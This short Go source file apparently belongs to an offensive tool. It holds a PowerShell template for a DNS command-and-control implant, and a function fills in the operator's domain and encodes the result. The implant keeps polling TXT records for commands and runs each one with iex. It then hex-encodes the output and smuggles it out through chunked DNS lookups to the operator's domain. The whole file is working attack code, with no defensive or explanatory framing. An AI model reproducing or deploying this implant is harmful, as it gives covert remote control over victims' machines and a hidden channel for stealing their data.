package main

import "fmt"

const psRecursive = `
$url = "%s";
function execDNS($cmd) {
$c = iex $cmd 2>&1 | Out-String;
$u = [system.Text.Encoding]::UTF8.GetBytes($c);
$string = [System.BitConverter]::ToString($u);
$string = $string -replace '-','';
$len = $string.Length;
$split = 50;
$repeat=[Math]::Floor($len/$split);
$remainder=$len%%$split;
if($remainder){ $repeatr = $repeat+1};
$rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
$q = resolve-dnsname -type 1 $ur;
for($i=0;$i-lt$repeat;$i++){
    $str = $string.Substring($i*$Split,$Split);
    $rnd = Get-Random;$ur1 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = resolve-dnsname -type 1 $ur1;
};
if($remainder){
    $str = $string.Substring($len-$remainder);
    $i = $i +1
    $rnd = Get-Random;$ur2 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = resolve-dnsname -type 1 $ur2;
};
$rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = resolve-dnsname -type 1 $s;
};
while (1){
   $c = Get-Random;
   Start-Sleep -s 3
   $u=$c.ToString()+"."+$url;$txt = resolve-dnsname -type 16 -dnsonly $u | select-object Strings | Out-String
   $txt = $txt.split("` + "`" + `n") | %%{$_.split('{')[1]} | Out-String
   $txt = $txt.split("` + "`" + `n") | %%{$_.split('}')[0]} | Out-String
   if ($txt -match 'NoCMD'){continue}
   elseif ($txt -match 'exit'){Exit}
   else{execDNS($txt)}
}
`

func getRecursivePayload(domain string) string {
	return powershellEncode(fmt.Sprintf(psRecursive, domain))
}
